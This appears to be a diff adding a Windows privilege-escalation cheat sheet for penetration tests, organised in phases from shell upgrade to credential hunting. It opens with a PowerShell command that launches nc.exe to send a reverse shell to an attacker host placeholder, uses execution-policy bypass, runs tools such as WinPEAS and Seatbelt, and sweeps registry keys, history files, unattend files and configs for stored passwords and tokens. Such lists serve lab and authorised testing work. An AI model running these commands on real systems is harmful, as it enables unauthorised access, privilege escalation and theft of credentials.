@@ -1,0 +1,87 @@
+# === SHELL UPGRADE ===
+# Upgrade cmd to PowerShell immediately
+powershell -ep bypass
+powershell -NoProfile -ExecutionPolicy Bypass
+# Spawn new reverse shell from existing limited shell
+powershell -c "Start-Process -NoNewWindow -FilePath 'C:\Windows\Temp\nc.exe' -ArgumentList '{{KALI}} {{KALI_PORT}} -e cmd'"
+
+# === PHASE 1: INSTANT WINS (run ALL before moving on) ===
+# Who am I - SeImpersonate/SeAssignPrimaryToken = Potato family immediately
+whoami /all
+# Stored credentials - runas /savecred if found
+cmdkey /list
+# OS info + patch level
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain" /C:"Hotfix(s)"
+# Users and admins
+net user
+net localgroup administrators
+# Running processes + ports - cross-reference loopback listeners
+tasklist /v
+netstat -ano
+# Non-standard folders - recent timestamps = scheduled task activity
+dir /a C:\
+dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+# Non-System32 services running as LocalSystem = high priority
+Get-CimInstance Win32_Service | Select Name,StartName,State,PathName | Where-Object {$_.PathName -notmatch '\\System32\\'}
+# AV check
+wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname
+
+# === PHASE 2: AUTOMATED TOOLS ===
+# PrivescCheck - best first automated pass
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+# WinPEAS - exhaustive but noisy - save output for parsing
+.\winPEASany.exe > winpeas_out.txt
+# Quick parse - high value findings only
+Select-String -Path winpeas_out.txt -Pattern "AlwaysInstall|Unquoted|SeImpersonate|Cleartext|credential|CVE-"
+# Seatbelt - broad security audit
+.\Seatbelt.exe -group=all
+
+# === PHASE 3: NETWORK ===
+ipconfig /all
+arp -a
+route print
+# Test connectivity to other hosts (pivoting awareness)
+Test-NetConnection {{DC_IP}} -Port 445
+
+# === PHASE 4: SERVICES ===
+# Unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+# All service details
+sc query type= all state= all
+# Weak service permissions check
+.\accesschk64.exe {{USER}} -wvu "C:\Program Files" -accepteula
+.\accesschk64.exe "Authenticated Users" -wvu "C:\Program Files" -accepteula
+
+# === PHASE 5: SCHEDULED TASKS ===
+schtasks /query /fo LIST /v
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+# Watch filesystem for task-created/modified files
+Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.CreationTime -gt (Get-Date).AddMinutes(-10) -and $_.FullName -notlike "C:\Windows\*"} | Select FullName,CreationTime | Sort CreationTime -Descending
+
+# === PHASE 6: CREDENTIAL HUNTING ===
+# PowerShell history
+Get-Content (Get-PSReadlineOption).HistorySavePath
+# KeePass, keys, sensitive docs
+Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.docx,*.log,*.kdbx,*.pem,*.ppk -File -Recurse -ErrorAction SilentlyContinue
+# Backup/old files outside Windows dir
+Get-ChildItem -Path C:\ -Include *.bak,*.old,*.sql,*.dump -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.FullName -notmatch '\\Windows\\'}
+# Quick secret search
+gci C:\Users -r -file -ea 0 | ? {$_.Extension -match '\.(txt|ini|cfg|xml|ps1)$'} | sls 'password|passwd|pwd|token|secret' -CaseSensitive:$false -List
+# Registry credential hunting
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+# Unattend/sysprep files
+Get-ChildItem -Recurse c:\windows -Include Unattend.xml,sysprep.xml -File -Force -ErrorAction SilentlyContinue
+# IIS / web configs
+Get-ChildItem -Path c:\inetpub -Include web.config,connectionstrings.config -File -Recurse -Force -ErrorAction SilentlyContinue
+# XAMPP configs
+Get-ChildItem -Recurse C:\xampp -Include *.txt,*.ini -File -ErrorAction SilentlyContinue
+
+# === PHASE 7: ACL & PATH ===
+# Check PATH for writable directories
+for %D in (%PATH:;= %) do @echo checking %D & icacls "%D" 2>nul
+# Environment - look for writable dirs early in PATH
+echo %PATH%
+$env:PATH.Split(';') | ForEach-Object { if (Test-Path $_) { (Get-Acl $_).Access | Where-Object { $_.IdentityReference -match $env:USERNAME -and $_.FileSystemRights -match 'Write' } | Select @{N='Path';E={$_}},FileSystemRights } }
